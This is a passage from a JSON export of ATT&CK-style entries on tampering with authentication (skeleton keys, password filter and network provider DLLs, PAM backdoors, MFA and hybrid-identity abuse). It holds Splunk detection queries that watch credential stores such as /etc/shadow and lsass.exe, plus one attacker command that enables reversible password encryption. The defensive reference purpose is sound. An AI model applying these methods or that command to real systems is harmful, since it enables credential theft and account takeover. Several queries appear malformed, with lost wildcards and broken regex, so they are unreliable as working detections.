      "Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Password filters will also show up as an autorun and loaded DLL in lsass.exe.[17]If AD FS is in use, monitor the AD FS server for the creation of DLLs as well as the loading of unrecognized or unsigned DLLs into theMicrosoft.IdentityServer.Servicehostapplication.[7]Analytic 1 - Unauthorized DLL loads in critical systems.index=security sourcetype IN (\"WinEventLog:Microsoft-Windows-Sysmon/Operational\", \"linux_secure\", \"macos_secure\")(EventCode=7 OR EventCode=10 OR sourcetype=\"linux_secure\" OR sourcetype=\"macos_secure\")| eval ImageLoaded=coalesce(Image, file_path, target_file)| eval Process=coalesce(ProcessGuid, pid, process_id)| eval User=coalesce(User, user, user_name)| eval Platform=case(    sourcetype==\"WinEventLog:Microsoft-Windows-Sysmon/Operational\", \"Windows\",    sourcetype==\"linux_secure\", \"Linux\",    sourcetype==\"macos_secure\", \"macOS\",    true(), \"Unknown\")| search ImageLoaded IN (    \"\\lsass.exe\",    \"\\services.exe\",    \"\\winlogon.exe\",    \"/usr/libexec/\",    \"/usr/bin/\",    \"/etc/pam.d/\",    \"/Library/Preferences/com.apple.loginwindow.plist\")| search ImageLoaded IN (\"\\.dll\", \"/.so\", \"/.dylib\")| eval isSuspicious=if(match(ImageLoaded, \".\\(?!\\\")(lsass|services|winlogon).exe\\.\\.dll$|/usr/libexec/.\\.so$|/usr/bin/.\\.so$|/etc/pam.d/.\\.so$|/Library/Preferences/com.apple.loginwindow.plist.\\.dylib$\"), \"Yes\", \"No\")| where isSuspicious=\"Yes\"| bin _time span=1m| stats count by _time, User, ImageLoaded, Process, Platform, host| where count > 1| table _time, User, ImageLoaded, Process, Platform, host, count| sort -count </code",
      "Monitor for calls toOpenProcessthat can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).[18]Monitor for abnormal API calls toNPLogonNotify()that may highlight malicious network provider DLLs.[19]Analytic 1 - Unauthorized API calls to manipulate lsass.exe or abnormal API callsindex=security sourcetype IN (\"Sysmon\", \"WinEventLog:Security\", \"Powershell\", \"linux_audit\", \"macos_secure\")(EventCode=4688 OR EventCode=10 OR EventID=4104)| eval CommandLine=coalesce(CommandLine, process_command_line, message)| eval User=coalesce(User, user, user_name)| eval Platform=case(    sourcetype==\"WinEventLog:Microsoft-Windows-Sysmon/Operational\", \"Windows\",    sourcetype==\"linux_audit\", \"Linux\",    sourcetype==\"macos_secure\", \"macOS\",    true(), \"Unknown\")| search CommandLine IN (\"SetWindowsHookEx\", \"LogonUser\", \"AuthenticateUser\", \"pam_unix\", \"pam_exec\", \"osascript\", \"launchctl\")| eval isSuspicious=if(    (Platform=\"Windows\" AND (match(CommandLine, \".SetWindowsHookEx.|.LogonUser.|.CredWrite.\"))),    (Platform=\"Linux\" AND (match(CommandLine, \".pam_unix.|.pam_exec.\"))),    (Platform=\"macOS\" AND (match(CommandLine, \".osascript.|.launchctl.\"))),    \"Yes\", \"No\")| where isSuspicious=\"Yes\"| stats count by _time, User, CommandLine, Platform, host| where count > 1| table _time, User, CommandLine, Platform, host, count| sort -countAnalytic 2 - Unauthorized API calls to manipulate lsass.exe or abnormal API calls to NPLogonNotify().index=security_logs source=\"WinEventLog:Security\" | eval suspicious_processes=if((process_name=\"lsass.exe\" AND action=\"OpenProcess\") OR (dll_name IN (\"cryptdll.dll\", \"samsrv.dll\") AND (action=\"modify\" OR action=\"load\")) OR (api_call=\"NPLogonNotify\" AND dll_name=\"unknown\")), \"true\", \"false\")| search suspicious_processes=\"true\"| stats count by host, process_name, dll_name, api_call, user, action| where count > 1",
      "Monitor for unexpected processes interacting with authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts.Analytic 1 - Unauthorized process interactions with authentication mechanisms.( index=your_index source=\"WinEventLog:Security\" EventCode=4688 | where (New_Process_Name IN (\"C:\\Windows\\System32\\lsass.exe\", \"C:\\Windows\\System32\\winlogon.exe\"))AND (Parent_Process_Name != \"C:\\Windows\\System32\\services.exe\")| stats count by New_Process_Name, Parent_Process_Name, Account_Name, ComputerName) OR (index=your_index sourcetype=linux_auditd| where file IN (\"/etc/pam.d/\", \"/etc/passwd\", \"/etc/shadow\")| stats count by file, user, host )",
      "Monitor for account authentications in which MFA credentials are not provided by the user account to the authenticating entity.Analytic 1 - Windows Successful logons without MFA.index=your_index sourcetype=\"WinEventLog:Security\" EventCode=4624 | eval MFA_used=if(searchmatch(\"MFA\"), \"Yes\", \"No\")| where MFA_used=\"No\"| stats count by Account_Name, Logon_Type, IpAddress, ComputerNameAnalytic 2 - Linux Successful logons without MFA.index=your_index sourcetype=\"linux_secure\" OR sourcetype=\"macos_auth\" \"Accepted password\" | eval MFA_used=if(searchmatch(\"MFA\"), \"Yes\", \"No\")| where MFA_used=\"No\"| stats count by user, src_ip, host",
      "Monitor for the enrollment of devices and user accounts with alternative security settings that do not require MFA credentials for successful logon.Analytic 1 - Unauthorized modification of user accounts Windows (User Account Modification)index=your_index sourcetype=\"WinEventLog:Security\" EventCode IN (4720, 4722, 4724, 4738, 4725, 4732, 4733, 4735, 4737) | eval Risk_Level=if(MemberName=\"Domain Admins\" OR MemberName=\"Administrators\", \"High\", \"Low\")| stats count by TargetUserName, AccountName, EventCode, Risk_Level, ComputerName| where Risk_Level=\"High\"Analytic 2 - macOS/Linux (User Account Modification)index=your_index sourcetype=\"linux_secure\" OR sourcetype=\"macos_auth\" \"usermod\" OR \"passwd\" OR \"chpasswd\" OR \"adduser\" OR \"deluser\" OR \"vipw\" | stats count by user, command, src_ip, host | where command IN (\"usermod\", \"passwd\", \"chpasswd\", \"adduser\", \"deluser\", \"vipw\")",
      "Monitor for the addition of network provider Registry keys (e.g.,HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<NetworkProviderName>\\NetworkProvider).Analytic 1 - Unauthorized addition of network provider Registry keys.sourcetype=WinEventLog:Security(EventCode=4663 OR EventCode=4657) | eval registry_path=mvindex(split(ObjectName,\"\\\"), 0, mvcount(split(ObjectName,\"\\\"))-1)| search registry_path IN (\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\", \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\", \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters\")",
      "Monitor for changes to Registry entries for password filters (ex:HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages) and correlate then investigate the DLL files these files reference.Monitor for changes to Registry entries for network providers (e.g.,HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order) and correlate then investigate the DLL files these values reference.Analytic 1 - Unauthorized modifications to Registry entries for password filters or network providers.index=wineventlog| eval suspicious_activity=if((EventCode=4657 AND (RegistryKeyPath=\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages\" OR RegistryKeyPath=\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\")) OR (EventCode=4663 AND AccessMask=\"0x2\" AND (ObjectName=\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages\" OR ObjectName=\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\")), \"true\", \"false\")Analytic 2 - Unauthorized modification of windows Registry keys may modify authentication mechanismsourcetype=WinEventLog:Security(EventCode=4657 OR EventCode=4663) | eval registry_path=mvindex(split(ObjectName,\"\\\"), 0, mvcount(split(ObjectName,\"\\\"))-1)| search registry_path IN (\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\",                            \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WDigest\\Parameters\",                            \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\",                           \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL\")"
    ],
    "Procedure Examples": [
      "ArcaneDoorincluded modification of the AAA process to bypass authentication mechanisms.[1]",
      "Eburycan intercept private keys using a trojanizedssh-addfunction.[2]",
      "FIN13has replaced legitimate KeePass binaries with trojanized versions to collect passwords from numerous applications.[3]",
      "Kesselhas trojanized thessh_loginanduser-auth_pubkeyfunctions to steal plaintext credentials.[4]",
      "SILENTTRINITYcan create a backdoor in KeePass using a malicious config file and in TortoiseSVN using a registry hook.[5]"
    ]
  },
  "T1556.001": {
    "Name": "Modify Authentication Process:Domain Controller Authentication",
    "Description": "Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts.Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex:Skeleton Key). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.[1]",
    "Detects": [
      "Monitor for changes to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).[1]Analytic 1 - Unauthorized changes to authentication-related DLLs.index=windows sourcetype=WinEventLog:Security (    (EventCode=4663 AND Object_Type=\"File\" AND Object_Name IN (\"C:\\Windows\\System32\\lsass.exe\", \"C:\\Windows\\System32\\samlib.dll\", \"C:\\Windows\\System32\\cryptdll.dll\", \"C:\\Windows\\System32\\samsrv.dll\"))    OR (EventCode=4662 AND Object_Type=\"File\" AND Object_Name IN (\"C:\\Windows\\System32\\lsass.exe\", \"C:\\Windows\\System32\\samlib.dll\", \"C:\\Windows\\System32\\cryptdll.dll\", \"C:\\Windows\\System32\\samsrv.dll\"))    OR (EventCode=4670 AND Object_Name IN (\"C:\\Windows\\System32\\lsass.exe\", \"C:\\Windows\\System32\\samlib.dll\", \"C:\\Windows\\System32\\cryptdll.dll\", \"C:\\Windows\\System32\\samsrv.dll\")))",
      "Monitor for newly constructed logon behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access). Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.[7]Analytic 1 - Unusual logon patterns and times.index=windows sourcetype=\"WinEventLog:Security\" (    (EventCode=4624 OR EventCode=4768) AND    Logon_Type=3 AND    NOT [search index=windows sourcetype=\"WinEventLog:Security\" EventCode=4768 | stats count by Account_Name | where count < 10 | fields Account_Name])",
      "Monitor for API calls to OpenProcess that can be used to manipulate lsass.exe running on a domain controller",
      "Monitor for unexpected processes interacting with the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts.Analytic 1 - Unauthorized process interactions with domain controller authentication processes.index=windows_logs (sourcetype=\"WinEventLog:Security\" OR sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\")| search (EventCode=4688 AND New_Process_Name=\"\\lsass.exe\") OR (EventCode=10 AND TargetImage=\"\\lsass.exe\")| eval suspicious_process=case(    match(New_Process_Name, \"regex_for_unusual_process_paths\"), \"High\",    match(New_Process_Name, \".\\system32\\.\"), \"Medium\",    true(), \"Low\"  )| stats count by Host, User, New_Process_Name, CommandLine, suspicious_process| where suspicious_process=\"High\"| lookup domain_admins user as User OUTPUT admin_status| where isnotnull(admin_status)| join type=left Host [    search index=windows_logs sourcetype=\"WinEventLog:Security\" EventCode=4624    | eval login_time=strftime(_time, \"%Y-%m-%d %H:%M:%S\")    | fields Host, login_time, Logon_Type, User  ]| eval login_behavior=if(Logon_Type=\"10\" AND admin_status=\"true\", \"External_Admin_Login\", \"Normal_Login\")| table _time, Host, User, New_Process_Name, CommandLine, suspicious_process, login_behavior, login_time| sort - _time"
    ],
    "Procedure Examples": [
      "Chimera's malware has altered the NTLM authentication program on domain controllers to allowChimerato login without a valid credential.[2]",
      "Skeleton Keyis used to patch an enterprise domain controller authentication process with a backdoor password. It allows adversaries to bypass the standard authentication system to use a defined password for all accounts authenticating to that domain controller.[1]"
    ]
  },
  "T1556.002": {
    "Name": "Modify Authentication Process:Password Filter DLL",
    "Description": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated.Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.[1]",
    "Detects": [
      "Monitor for newly constructed files that may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated.Analytic 1 - Unauthorized DLL registration.index=windows_logs sourcetype=\"WinEventLog:Security\" OR sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\"| search (EventCode=4688 AND (CommandLine=\"regsvr32\" OR CommandLine=\"rundll32\") AND CommandLine=\"password.dll\")| join type=left Host [    search index=windows_logs sourcetype=\"WinEventLog:System\"    | eval File_Creation_Time=strftime(_time, \"%Y-%m-%d %H:%M:%S\")    | where EventCode=7045 OR EventCode=2    | fields Host, File_Creation_Time, FileName, FilePath  ]| eval suspected_dll=if(match(FilePath, \".\\System32\\.\") OR match(FilePath, \".\\SysWOW64\\.\"), \"High\", \"Low\")",
      "Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Password filters will also show up as an autorun and loaded DLL in lsass.exe.[4]Analytic 1 - Unauthorized DLL loads in critical systems.index=windows_logs sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\"| search EventCode=7 [search index=windows_logs EventCode=4688 (ProcessName=\"lsass.exe\" OR ProcessName=\"winlogon.exe\") | fields ProcessID]| eval dll_path=coalesce(ImageLoaded, Image)| search dll_path=\"\\System32\\\" OR dll_path=\"\\SysWOW64\\\"| rex field=dll_path \".*\\(?[^\\]+.dll)$\"",
      "Monitor for changes to Registry entries for password filters (ex: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages) and correlate then investigate the DLL files these files reference.Analytic 1 - Unauthorized modifications to Registry entries for password filters.index=windows_logs sourcetype=\"WinEventLog:Security\" (EventCode=4657 OR EventCode=4688)| search (    (TargetObject=\"\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" AND ValueName=\"Notification Packages\")    OR (TargetObject=\"\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" AND ValueName=\"Authentication Packages\")    OR (CommandLine=\"reg.exe\" AND CommandLine=\"add\" AND CommandLine=\"Lsa\")  )| eval Modification_Type=case(    like(CommandLine, \"%reg.exe% add%\"), \"Command Line Registry Edit\",    EventCode=4657, \"Direct Registry Modification\"  )"
    ],
    "Procedure Examples": [
      "OilRighas registered a password filter DLL in order to drop malware.[2]",
      "Remsecharvests plain-text credentials as a password filter registered on domain controllers.[3]",
      "Striderhas registered its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter to acquire credentials any time a domain, local user, or administrator logs in or changes a password.[3]"
    ]
  },
  "T1556.003": {
    "Name": "Modify Authentication Process:Pluggable Authentication Modules",
    "Description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module ispam_unix.so, which retrieves, sets, and verifies account authentication information in/etc/passwdand/etc/shadow.[1][2][3]Adversaries may modify components of the PAM system to create backdoors. PAM components, such aspam_unix.so, can be patched to accept arbitrary adversary supplied values as legitimate credentials.[4]Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.[5][1]",
    "Detects": [
      "Monitor PAM configuration and module paths (ex: /etc/pam.d/) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.Analytic 1 - Unauthorized changes to PAM configuration and module paths.index=os sourcetype=\"linux_audit\" OR sourcetype=\"auditd\" (type=\"MODIFY\" OR type=\"CREATE\" OR type=\"DELETE\") (file=\"/etc/pam.d/\" OR file=\"/usr/lib/security/\" OR file=\"/lib/security/*\")",
      "Monitor for newly constructed logon behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).Analytic 1 - Unusual logon patterns and times.index=linux_logs OR index=macos_logs(source=\"/var/log/secure\" OR source=\"/var/log/auth.log\" OR source=\"/var/log/system.log\")(\"session opened\" OR \"session closed\")| eval is_normal_hours=if(hour(_time) >= 8 AND hour(_time) <= 18, 1, 0)| search NOT [search index=linux_logs OR index=macos_logs (source=\"/etc/pam.d/*\" OR source=\"/etc/passwd\" OR source=\"/etc/shadow\") action=modified | fields user]"
    ],
    "Procedure Examples": [
      "Eburycan deactivate PAM modules to tamper with the sshd configuration.[6]",
      "Skidmaphas the ability to replace the pam_unix.so file on an infected machine with its own malicious version that accepts a specific backdoor password for all users.[7]"
    ]
  },
  "T1556.004": {
    "Name": "Modify Authentication Process:Network Device Authentication",
    "Description": "Adversaries may usePatch System Imageto hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.Modify System Imagemay include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.[1]",
    "Detects": [
      "Monitor for changes made to the checksum of the operating system file and verifying the image of the operating system in memory.[4][5]Detection of this behavior may be difficult, detection efforts may be focused on closely related adversary behaviors, such as Modify System Image."
    ],
    "Procedure Examples": [
      "SLOWPULSEcan modify LDAP and two factor authentication flows by inspecting login credentials and forcing successful authentication if the provided password matches a chosen backdoor password.[2]",
      "SYNful Knockhas the capability to add its own custom backdoor password when it modifies the operating system of the affected network device.[1]"
    ]
  },
  "T1556.005": {
    "Name": "Modify Authentication Process:Reversible Encryption",
    "Description": "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. TheAllowReversiblePasswordEncryptionproperty specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.[1]If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:Encrypted password (G$RADIUSCHAP) from the Active Directory user-structureuserParameters16 byte randomly-generated value (G$RADIUSCHAPKEY) also fromuserParametersGlobal LSA secret (G$MSRADIUSCHAPKEY)Static key hardcoded in the Remote Access Subauthentication DLL (RASSFM.DLL)With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.[2][3]An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectoryPowerShellmodule. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher.[4]In PowerShell, an adversary may make associated changes to user settings using commands similar toSet-ADUser -AllowReversiblePasswordEncryption $true.",
    "Detects": [
      "Monitor property changes in Group Policy:Computer Configuration\\Windows Settings\\Security Settings\\Account Policies\\Password Policy\\Store passwords using reversible encryption. By default, the property should be set to Disabled.Analytic 1 - Enabling reversible encryption outside of standard procedures.index=windows source=\"WinEventLog:Security\" (EventCode=5136 OR EventCode=5137 OR EventCode=5138 OR EventCode=5139)| search AttributeLDAPDisplayName=\"msDS-User-Account-Control-Computed\" OR AttributeLDAPDisplayName=\"userParameters\"| rex field=_raw \"ObjectDN=(?P[^,]+)\"| eval Modification=if(match(AttributeValue, \".;PwdProperties=1.\"), \"Enabled\", \"Disabled\")| stats count by ObjectDN, Modification, EventCode, AttributeValue| where Modification=\"Enabled\"",
      "Monitor command-line usage for-AllowReversiblePasswordEncryption $trueor other actions that could be related to malicious tampering of user settings (i.e.Group Policy Modification).Analytic 1 - Command-line actions indicating changes to encryption settings.index=security (sourcetype=\"WinEventLog:Security\" OR sourcetype=\"powershell\")(EventCode=4688 OR EventCode=4104) commandline=\"set-aduser\" commandline=\"allowreversiblepasswordencryption\"         | table _time, Process_ID, User, CommandLine",
      "Consider monitoring and/or blocking suspicious execution of Active Directory PowerShell modules, such asSet-ADUserandSet-ADAccountControl, that change account configurations.",
      "Monitor Fine-Grained Password Policies and regularly audit user accounts and group settings.[4]"
    ],
    "Procedure Examples": [
      "Ensure thatAllowReversiblePasswordEncryptionproperty is set to disabled unless there are application requirements.[1]",
      "Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.[5][6]These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.[7]"
    ]
  },
  "T1556.006": {
    "Name": "Modify Authentication Process:Multi-Factor Authentication",
    "Description": "Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.Once adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such asMulti-Factor Authentication Request Generation, adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.[1][2]For example, modifying the Windows hosts file (C:\\windows\\system32\\drivers\\etc\\hosts) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA.[3]Depending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.[3]",
    "Detects": [
      "Monitor for changes made to AD security settings related to MFA logon requirements, such as changes to Azure AD Conditional Access Policies or the registration of new MFA applications.",
      "Monitor for changes made to global multi-factor authentication settings in Identity-as-a-Service providers. For example, in Okta environments, the eventssystem.mfa.factor.activateandsystem.mfa.factor.deactivatewill trigger when an MFA factor is globally activated or deactivated.[7]Analytic 1 - Changes to MFA settings outside of normal maintenance windows.index=security sourcetype=\"audit\" OR sourcetype=\"azure:eventhub\" OR sourcetype=\"o365:management:activity\" OR sourcetype=\"gsuite:reports:admin\" EventCode IN (\"UserAddedToMFAExcludedGroup\", \"MFASettingsModified\", \"MFASettingsDisabled\", \"AddMFAOption\", \"RemoveMFAOption\", \"MFAEnforcementDisabled\")",
      "Monitor for logon sessions for user accounts and devices that did not require MFA for authentication.Analytic 1 - Successful logons without MFA.index=security sourcetype=\"azure:eventhub\" OR sourcetype=\"o365:management:activity\" OR sourcetype=\"gsuite:reports:admin\" OR sourcetype=\"linux_secure\" OR sourcetype=\"WinEventLog:Security\" (EventID=\"4624\" OR EventID=\"4648\" OR EventID=\"AuthenticationSuccess\" OR EventCode IN (\"4104\", \"552\", \"1200\") OR EventName=\"UserLoggedIn\" OR action=\"login_success\")| eval MFA_used = case(    isnotnull('AdditionalProperties.MFARequired') AND AdditionalProperties.MFARequired=\"true\", \"MFA\",    isnotnull('AdditionalProperties.MFAStatus') AND AdditionalProperties.MFAStatus=\"success\", \"MFA\",    isnotnull('AdditionalProperties.MFA') AND AdditionalProperties.MFA=\"success\", \"MFA\",    isnotnull('AuthenticationMethod') AND AuthenticationMethod IN (\"MFA\", \"TOTP\", \"U2F\", \"Push Notification\"), \"MFA\",    isnotnull('MultiFactorUsed') AND MultiFactorUsed=\"Yes\", \"MFA\",    1==1, \"No MFA\")| search MFA_used=\"No MFA\"",
      "Monitor for account authentications in which MFA credentials are not provided by the user account to the authenticating entity.",
      "Monitor for the enrollment of devices and user accounts with alternative security settings that do not require MFA credentials for successful logon. Monitor for attempts to disable MFA on individual user accounts.[6]Additionally, monitor for attempts to change or reset users’ MFA factor settings. For example, in Okta environments, the eventuser.mfa.factor.reset_allwill trigger when all MFA factors are reset for a user.[7]Analytic 1 - Unusual registration of MFA devices, changes to StrongAuthenticationPhoneAppDetail properties.index=\"m365_audit_logs\" Workload=\"AzureActiveDirectory\" Operation=\"Update user\" Actor=\"Azure MFA StrongAuthenticationService\"| search ObjectId!=\"expected_user_id\"| table CreationTime, Actor, ObjectId, IPAddress, ModifiedProperties"
    ],
    "Procedure Examples": [
      "TheAADInternalsSet-AADIntUserMFAcommand can be used to disable MFA for a specified user.",
      "After compromising user accounts,Scattered Spiderregisters their own MFA tokens.[4]",
      "SLOWPULSEcan insert malicious logic to bypass RADIUS and ACE two factor authentication (2FA) flows if a designated attacker-supplied password is provided.[5]"
    ]
  },
  "T1556.007": {
    "Name": "Modify Authentication Process:Hybrid Identity",
    "Description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.Many organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID[1]:Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Entra ID, allowing authentication to Entra ID to take place entirely in the cloudPass Through Authentication (PTA), in which Entra ID authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active DirectoryActive Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Entra IDAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges.By modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into theAzureADConnectAuthenticationAgentServiceprocess that authorizes all attempts to authenticate to Entra ID, as well as records user credentials.[2][3]In environments using AD FS, an adversary may edit theMicrosoft.IdentityServer.Servicehostconfiguration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.[4]In some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user.[5]",
    "Detects": [
      "Enable security auditing to collect logs from hybrid identity solutions. For example, monitor sign-ins to the Entra ID Application Proxy Connector, which are typically generated only when a new PTA Agent is added.[5]If AD FS is in use, review the logs for event ID 501, which specifies all EKU attributes on a claim, and raise alerts on any values that are not configured in your environment.[4]",
      "Monitor for suspicious modification of files associated with hybrid identity authentication processes, such as configuration files. Monitor for access to certificates and cryptographic keys material.",
      "Monitor for discrepancies in authentication to cloud services, such as PTA sign-ins recorded in Entra ID that lack corresponding events in AD.[6]",
      "Monitor the hybrid identity solution in use for the loading of unauthorized DLLs. For example, monitor all PTA agent servers for the creation of DLLs as well as the loading of DLLs into theAzureADConnectAuthenticationAgentServiceprocess.[5]If AD FS is in use, monitor the AD FS server for the creation of DLLs as well as the loading of unrecognized or unsigned DLLs into theMicrosoft.IdentityServer.Servicehostapplication.[4]"
    ],
    "Procedure Examples": [
      "AADInternalscan inject a malicious DLL (PTASpy) into theAzureADConnectAuthenticationAgentServiceto backdoor Azure AD Pass-Through Authentication.[3]",
      "APT29has edited theMicrosoft.IdentityServer.Servicehost.exe.configfile to load a malicious DLL into the AD FS process, thereby enabling persistent access to any service federated with AD FS for a user with a specified User Principal Name.[4]"
    ]
  },
  "T1556.008": {
    "Name": "Modify Authentication Process:Network Provider DLL",
    "Description": "Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions.[1]During the logon process, Winlogon (the interactive logon module) sends credentials to the localmpnotify.exeprocess via RPC. Thempnotify.exeprocess then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.[2][3][4]Adversaries can configure a malicious network provider DLL to receive credentials frommpnotify.exe.[5]Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via theNPLogonNotify()function.[4]Adversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.[2]",
    "Detects": [
      "Monitor for newly created files that may be used to register malicious network provider dynamic link libraries (DLLs).",
      "Monitor for abnormal API calls toNPLogonNotify().[4]",
      "Monitor for the addition of network provider Registry keys (e.g.,HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<NetworkProviderName>\\NetworkProvider).",
      "Monitor for changes to Registry entries for network providers (e.g.,HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order) and correlate then investigate the DLL files these values reference."
    ],
    "Procedure Examples": [
